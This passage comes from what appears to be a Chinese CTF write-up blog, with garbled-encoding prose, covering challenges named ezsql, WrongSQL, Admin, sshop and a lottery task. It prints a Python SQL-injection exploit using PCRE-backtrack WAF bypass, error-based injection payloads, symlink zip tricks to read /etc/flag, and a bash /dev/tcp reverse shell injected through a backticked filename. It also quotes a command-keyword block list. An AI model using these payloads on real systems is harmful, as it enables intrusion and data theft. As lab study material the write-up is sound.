class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1, shrink-to-fit=no"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"description"</span> <span class="attr">content</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"author"</span> <span class="attr">content</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"icon"</span> <span class="attr">href</span>=<span class="string">"./bootstrap-4.0.0/favicon.ico"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>ezsql<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Bootstrap core CSS --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"./bootstrap-4.0.0/dist/css/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Custom styles for this template --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"starter-template.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">"navbar navbar-expand-md navbar-dark bg-dark fixed-top"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"navbar-brand"</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>ezsql<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"navbar-toggler"</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">data-toggle</span>=<span class="string">"collapse"</span> <span class="attr">data-target</span>=<span class="string">"#navbarsExampleDefault"</span> <span class="attr">aria-controls</span>=<span class="string">"navbarsExampleDefault"</span> <span class="attr">aria-expanded</span>=<span class="string">"false"</span> <span class="attr">aria-label</span>=<span class="string">"Toggle navigation"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"navbar-toggler-icon"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"collapse navbar-collapse"</span> <span class="attr">id</span>=<span class="string">"navbarsExampleDefault"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"navbar-nav mr-auto"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-item"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"nav-link"</span> <span class="attr">href</span>=<span class="string">"./index.php"</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-item active"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"nav-link"</span> <span class="attr">href</span>=<span class="string">"./file.php?file=list"</span>&gt;</span>List<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"sr-only"</span>&gt;</span>(current)<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"dropdown-menu"</span> <span class="attr">aria-labelledby</span>=<span class="string">"dropdown01"</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"dropdown-item"</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>Action<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"dropdown-item"</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>Another action<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"dropdown-item"</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>Something else here<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">main</span> <span class="attr">role</span>=<span class="string">"main"</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"starter-template"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>ezsql<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"lead"</span>&gt;</span>        </span><br><span class="line">        <span class="php"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">"sql.php"</span>)<span class="meta">?&gt;</span></span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">main</span>&gt;</span><span class="comment">&lt;!-- /.container --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Bootstrap core JavaScript</span></span><br><span class="line"><span class="comment">    ================================================== --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Placed at the end of the document so the pages load faster --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://code.jquery.com/jquery-3.2.1.slim.min.js"</span> <span class="attr">integrity</span>=<span class="string">"sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN"</span> <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">window.jQuery || document.write('<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./bootstrap-4.0.0/assets/js/vendor/jquery-slim.min.js"</span>&gt;</span><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">\</span>/<span class="attr">script</span>&gt;</span>')</span></span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./bootstrap-4.0.0/assets/js/vendor/popper.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./bootstrap-4.0.0/dist/js/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å‰ç«¯ä»£ç ï¼Œåœ¨è¿™é‡Œé¢æ‰¾åˆ°äº†åŒ…å«çš„sql.phpæ–‡ä»¶ï¼Œè¯»å–sql.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line">$id=<span class="keyword">isset</span>($_POST[<span class="string">'id'</span>]) ? $_POST[<span class="string">'id'</span>] : <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/UNION.+?SELECT|\/\*.*\*\/|sleep|and|if|&amp;&amp;|\|\||\^|%|ascii|mid|left|greatest|least|substr|=|-|&lt;|&gt;|benchmark|like|in|between|regexp/is'</span>, $id)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'SQL Injection'</span>);</span><br><span class="line">&#125;</span><br><span class="line">mysqli_query($conn,<span class="string">"set names utf8"</span>);</span><br><span class="line">$sql=<span class="string">"select * from `ctf` where id ='"</span>.$id.<span class="string">"'"</span>;</span><br><span class="line">$result=mysqli_query($conn,$sql);</span><br><span class="line">$row=mysqli_fetch_row($result);</span><br><span class="line"><span class="keyword">if</span>($id==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='./img/1.png'&gt;&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>($id==<span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">"&lt;img src='./img/2.jpg'&gt;&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>($id==<span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">"&lt;img src='./img/3.jpg'&gt;&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"what do you do?"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å‘ç°å¸¸ç”¨çš„æ³¨å…¥å…³é”®è¯éƒ½è¢«è¿‡æ»¤äº†ï¼Œä¸€äº›ä½œç”¨ç›¸åŒçš„å…³é”®è¯ä¹Ÿè¢«è¿‡æ»¤ï¼Œè¿™é‡Œç”¨åˆ°äº†pç¥ä¸€ç¯‡æ–‡ç« çš„çŸ¥è¯†æ¥ç»•è¿‡WAFï¼Œåˆ©ç”¨PCREå›æº¯æ¬¡æ•°è¿›è¡Œè¿‡æ»¤ï¼Œè‹±æ–‡ç‰ˆçš„æ˜¯100ä¸‡æ¬¡ï¼Œ<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a></p><p>ä¸Šexp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://das.wetolink.com:44006/sql.php"</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">"id"</span>:<span class="string">"0' union/*"</span> + <span class="string">"a"</span> * <span class="number">1000000</span> + <span class="string">"*/select 1,version(),3#"</span></span><br><span class="line">&#125;</span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">"id"</span>:<span class="string">"0' union/*"</span> + <span class="string">"a"</span> * <span class="number">1000000</span> + <span class="string">"*/select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#"</span></span><br><span class="line">&#125;<span class="comment">#ctf,flag</span></span><br><span class="line">data2 = &#123;</span><br><span class="line">    <span class="string">"id"</span>:<span class="string">"0' union/*"</span> + <span class="string">"a"</span> * <span class="number">1000000</span> + <span class="string">"*/select 1,group_concat(column_name),3 from information_schema.columns where table_name='flag'#"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#id,flag</span></span><br><span class="line">data3 = &#123;</span><br><span class="line">    <span class="string">"id"</span>:<span class="string">"0' union/*"</span> + <span class="string">"a"</span> * <span class="number">1000000</span> + <span class="string">"*/select 1,group_concat(flag),3 from flag#"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#flag&#123;e22d7e217c1ceebc286c3d8e6ee70a0b&#125;  </span></span><br><span class="line">response = requests.post(url=url,data=data3)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure><h2 id="WrongSQL"><a href="#WrongSQL" class="headerlink" title="WrongSQL"></a>WrongSQL</h2><h3 id="çŸ¥è¯†ç‚¹-1"><a href="#çŸ¥è¯†ç‚¹-1" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul><li>æŠ¥é”™æ³¨å…¥</li><li>é•¿åº¦é™åˆ¶</li><li>WAFç»•è¿‡</li></ul><h3 id="è§£é¢˜æ­¥éª¤-1"><a href="#è§£é¢˜æ­¥éª¤-1" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><p>æ³¨å†Œç™»å½•ï¼Œåœ¨show.phpé¡µé¢å‘ç°idå¤„å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œæµ‹è¯•å‘ç°ï¼Œæ³¨é‡Šç¬¦ï¼Œunionï¼Œç©ºæ ¼ç­‰è¢«è¿‡æ»¤ï¼Œæ ¹æ®é¢˜ç›®ä»¥åŠè¢«è¿‡æ»¤çš„å…³é”®è¯ï¼Œåº”è¯¥ç”¨æŠ¥é”™æ³¨å…¥</p><p>å°è¯•ä¸€ä¸‹è¯»å–ç‰ˆæœ¬å·ï¼Œè¿™é‡Œç©ºæ ¼å¯ä»¥ç”¨/**/æˆ–è€…æ‹¬å·ç»•è¿‡,æœ€åé¢çš„#(%23)è¢«è¿‡æ»¤é—­åˆå•å¼•å·å³å¯</p><img src="/2020/08/15/DASfinaltest/1.png" class=""><p>è¯»å–æ•°æ®åº“åï¼Œè¿™é‡Œä¼šå‘ç°æœ‰é•¿åº¦é™åˆ¶ï¼Œå‡†ç¡®çš„è®²ï¼ŒæŠ¥é”™æ³¨å…¥åŸºæœ¬éƒ½ä¼šé™åˆ¶å›æ˜¾é•¿åº¦ï¼Œç”¨substræˆªå–åˆ†ä¸¤æ¬¡å›æ˜¾å°±å¯ä»¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1'and(extractvalue(1,concat(0x7e,substr((<span class="keyword">select</span>(<span class="keyword">group_concat</span>(schema_name))<span class="keyword">from</span>(information_schema.schemata)),<span class="number">55</span>,<span class="number">50</span>),<span class="number">0x7e</span>)))<span class="keyword">and</span><span class="string">'1</span></span><br><span class="line"><span class="string">#XPATH syntax error: '</span>~a,<span class="keyword">sys</span>,z3333333~<span class="string">'</span></span><br></pre></td></tr></table></figure><img src="/2020/08/15/DASfinaltest/2.png" class=""><p>è¯»å–æœ€åè¿™ä¸€ä¸ªæ•°æ®åº“</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1'and(extractvalue(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema)=<span class="string">'z3333333'</span>),<span class="number">0x7e</span>)))<span class="keyword">and</span><span class="string">'1</span></span><br></pre></td></tr></table></figure><img src="/2020/08/15/DASfinaltest/3.png" class=""><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1'and(extractvalue(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name)=<span class="string">'3333333z'</span>),<span class="number">0x7e</span>)))<span class="keyword">and</span><span class="string">'1</span></span><br></pre></td></tr></table></figure><img src="/2020/08/15/DASfinaltest/4.png" class=""><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1'and(extractvalue(1,concat(0x7e,substr((<span class="keyword">select</span>(fl4gbest)<span class="keyword">from</span>(z3333333<span class="number">.3333333</span>z)),<span class="number">1</span>,<span class="number">50</span>),<span class="number">0x7e</span>)))<span class="keyword">and</span><span class="string">'1</span></span><br><span class="line"><span class="string">?id=1'</span><span class="keyword">and</span>(extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">substr</span>((<span class="keyword">select</span>(fl4gbest)<span class="keyword">from</span>(z3333333<span class="number">.3333333</span>z)),<span class="number">20</span>,<span class="number">50</span>),<span class="number">0x7e</span>)))<span class="keyword">and</span><span class="string">'1</span></span><br></pre></td></tr></table></figure><img src="/2020/08/15/DASfinaltest/5.png" class=""><p>ä¸¤æ¬¡çš„ç»“æœæ‹¼æ¥å³å¯</p><h2 id="Admin"><a href="#Admin" class="headerlink" title="Admin"></a>Admin</h2><h3 id="çŸ¥è¯†ç‚¹-2"><a href="#çŸ¥è¯†ç‚¹-2" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul><li>ç¬¦å·é“¾æ¥ç›®å½•ç©¿è¶Š</li><li>å¼±å¯†ç çˆ†ç ´</li><li>zipæŒ‡ä»¤</li></ul><h3 id="è§£é¢˜æ­¥éª¤-2"><a href="#è§£é¢˜æ­¥éª¤-2" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><p>å¼€é¢˜éœ€è¦ç™»å½•ï¼Œä¸‡èƒ½å¯†ç ä¸èƒ½ç™»å½•ï¼Œå¹¶ä¸”sqlè¯­å¥æ²¡æœ‰ä»€ä¹ˆå›æ˜¾ï¼Œburpçˆ†ç ´è´¦å·å¯†ç ï¼Œå¾—åˆ°admin/admin</p><img src="/2020/08/15/DASfinaltest/6.png" class=""><p>ä¸‹é¢å°±æ˜¯å»ºç«‹ä¸€ä¸ªè½¯é“¾æ¥æŒ‡å‘flagæ‰€åœ¨çš„è·¯å¾„ï¼Œå¹¶ä¸”ä¿å­˜å‹ç¼©æˆzipæ–‡ä»¶ï¼Œè¦ä¿å­˜ç¬¦å·é“¾æ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s &#x2F;etc&#x2F;flag .&#x2F;</span><br><span class="line">zip -r ..&#x2F;tmp.zip . -y</span><br></pre></td></tr></table></figure><img src="/2020/08/15/DASfinaltest/7.png" class=""><p>ä¸Šä¼ æ–‡ä»¶å³å¯</p><img src="/2020/08/15/DASfinaltest/8.png" class=""><h2 id="sshop"><a href="#sshop" class="headerlink" title="sshop"></a>sshop</h2><h3 id="çŸ¥è¯†ç‚¹-3"><a href="#çŸ¥è¯†ç‚¹-3" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul><li>ä¿¡æ¯æ³„éœ²</li><li>pythonä»£ç å®¡è®¡</li><li>åå¼¹shell</li></ul><h3 id="è§£é¢˜æ­¥éª¤-3"><a href="#è§£é¢˜æ­¥éª¤-3" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><p>æ‰«æç›®å½•ï¼Œå‘ç°äº†<a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></p><p>ä¸‹è½½æ–‡ä»¶ï¼Œå®¡è®¡ä»£ç </p><p>åœ¨<code>www/sshop/view/User.py</code>é‡Œå‘ç°äº†å¯ä»¥æ§åˆ¶å‘½ä»¤æ‰§è¡Œï¼Œåœ¨UserImageHandlerç±»ä¸­</p><img src="/2020/08/15/DASfinaltest/9.png" class=""><p>è¿™åº”è¯¥æ˜¯ä¸Šä¼ ä¸ªäººå›¾ç‰‡çš„åœ°æ–¹ï¼Œæ‰¾ä¸€ä¸‹å¯¹åº”ä¸Šä¼ çš„ç±»æˆ–æ–¹æ³•ï¼Œåœ¨<code>www/sshop/view/Module.py</code>ä¸­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileUploadHandler</span><span class="params">(BaseHandler)</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self)</span>:</span></span><br><span class="line">self.render(<span class="string">'upload.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self)</span>:</span></span><br><span class="line">ret = &#123;<span class="string">'result'</span>: <span class="string">'OK'</span>&#125;</span><br><span class="line">upload_path = os.path.join(os.path.dirname(__file__), <span class="string">'upload'</span>) </span><br><span class="line">file_metas = self.request.files.get(<span class="string">'file'</span>, <span class="literal">None</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> file_metas:</span><br><span class="line">self.write(<span class="string">'&lt;script&gt;alert("please upload a image!")&lt;/script&gt;'</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> meta <span class="keyword">in</span> file_metas:</span><br><span class="line">filename = unquote(meta[<span class="string">'filename'</span>])</span><br><span class="line"><span class="keyword">if</span> os.path.splitext(filename)[<span class="number">1</span>] != <span class="string">'.jpg'</span> <span class="keyword">and</span> os.path.splitext(filename)[<span class="number">1</span>] != <span class="string">'.png'</span>:</span><br><span class="line">self.write(<span class="string">'&lt;script&gt;alert("only upoded jpg or png !")&lt;/script&gt;'</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">tmp = filename</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">3</span>):</span><br><span class="line">tmp = unquote(tmp)</span><br><span class="line"><span class="keyword">if</span> re.search(<span class="string">r'\||\;|\&amp;|\&gt;|\&lt;|\t|\n|\r|\.\.|rm|curl|wget|cat|mv|touch|db'</span>,tmp,re.IGNORECASE):</span><br><span class="line">self.write(<span class="string">'&lt;script&gt;alert("Hacking!!!")&lt;/script&gt;'</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">user = self.orm.query(User).filter(User.username == self.current_user).one()</span><br><span class="line">user.avatar = filename</span><br><span class="line">self.orm.commit()</span><br><span class="line">file_path = os.path.join(upload_path, filename)</span><br><span class="line"><span class="keyword">with</span> open(file_path, <span class="string">'wb'</span>) <span class="keyword">as</span> up:</span><br><span class="line">up.write(meta[<span class="string">'body'</span>])</span><br><span class="line">self.write(json.dumps(ret))</span><br><span class="line">self.redirect(<span class="string">'/user'</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå±è”½äº†ä¸€äº›å­—ç¬¦å’Œå…³é”®å­—ï¼Œå¯ä»¥è€ƒè™‘ç”¨åå¼•å·ä»¥åŠä¸Šä¼  bash æ–‡ä»¶å¹¶ä¸”ç”¨bashè°ƒç”¨é‚£ä¸ªæ–‡ä»¶åå¼¹ shell è¯•è¯•ï¼Œå†™å…¥ä¸€ä¸ªå›¾ç‰‡æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šä¼ çš„æ—¶å€™æŠ“åŒ…ä¿®æ”¹ä¸€ä¸‹é—®ä»¶åä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#96;bash sshop&#x2F;views&#x2F;upload&#x2F;a.png&#96;.png</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ ä¹‹ååˆ·æ–°ä¸ªäººé¡µé¢ï¼Œå¯ä»¥çœ‹åˆ°è§¦å‘äº†åå¼¹ï¼Œä¸‹é¢å°±æ˜¯æ‰¾flagæ–‡ä»¶å¹¶ä¸”æ‹¿åˆ°flag</p><img src="/2020/08/15/DASfinaltest/10.png" class=""><h2 id="å½©ç¥¨ä¸­å¿ƒ"><a href="#å½©ç¥¨ä¸­å¿ƒ" class="headerlink" title="å½©ç¥¨ä¸­å¿ƒ"></a>å½©ç¥¨ä¸­å¿ƒ</h2><h3 id="çŸ¥è¯†ç‚¹-4"><a href="#çŸ¥è¯†ç‚¹-4" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul><li>phpå¼±ç±»å‹æ¯”è¾ƒç»•è¿‡</li><li>jsonæ•°æ®</li><li>æ–‡ä»¶åŒ…å«</li><li>zipä¼ªåè®®</li><li>linux findå‘½ä»¤</li></ul><h3 id="è§£é¢˜æ­¥éª¤-4"><a href="#è§£é¢˜æ­¥éª¤-4" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><p>æ ¹æ®æç¤ºç›´æ¥æŠ“å–ä¹°å½©ç¥¨çš„åŒ…ï¼Œçœ‹ä¸€ä¸‹æ•°æ®æ ¼å¼ï¼Œæ˜¯jsonçš„ï¼Œè¿™ä¸ªè·Ÿä¹‹å‰é‡åˆ°è¿‡çš„é¢˜å¾ˆåƒï¼Œ7ä¸ªæ•°å­—å¯¹ä¸Šçš„å°±å¥–åŠ±é’±ï¼Œä¿®æ”¹ä¸€ä¸‹å‘é€çš„æ•°æ®ï¼Œè¿™é‡Œç”¨åˆ°å¼±ç±»å‹ï¼Œæµ‹è¯•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$number=<span class="string">'1234567'</span>;</span><br><span class="line">$target=<span class="keyword">array</span>(<span class="number">1</span>=&gt;<span class="keyword">true</span>,<span class="number">2</span>=&gt;<span class="keyword">true</span>);</span><br><span class="line">var_dump($target[<span class="number">1</span>]==$number[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="/2020/08/15/DASfinaltest/11.png" class=""><p>å¯ä»¥çœ‹åˆ°ç»“æœï¼Œå…¶å®å°±æ˜¯æ— è®ºæ•°å­—è¿˜æ˜¯å­—æ¯å’Œtrueä½œæ¯”è¾ƒè¿”å›çš„æ°¸è¿œæ˜¯trueï¼Œå°±å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ä¸€ç›´åˆ·å–é‡‘é’±ï¼Œåœ¨è¿™ä¹‹åä¼šå‘ç°é’±ä¸å¤Ÿä¹°flagï¼Œåªèƒ½ä¹°hintï¼Œè¿™é‡Œå‰ç«¯jsæ²¡æœ‰å“åº”ï¼ŒçŒœæµ‹è¿™é‡Œå’Œå‰é¢ä¹°å½©ç¥¨ä¸€æ ·çš„æ–¹æ³•ï¼ŒæŠŠactionçš„å€¼æ”¹ä¸ºhintåº”è¯¥å°±å¯ä»¥äº†</p><img 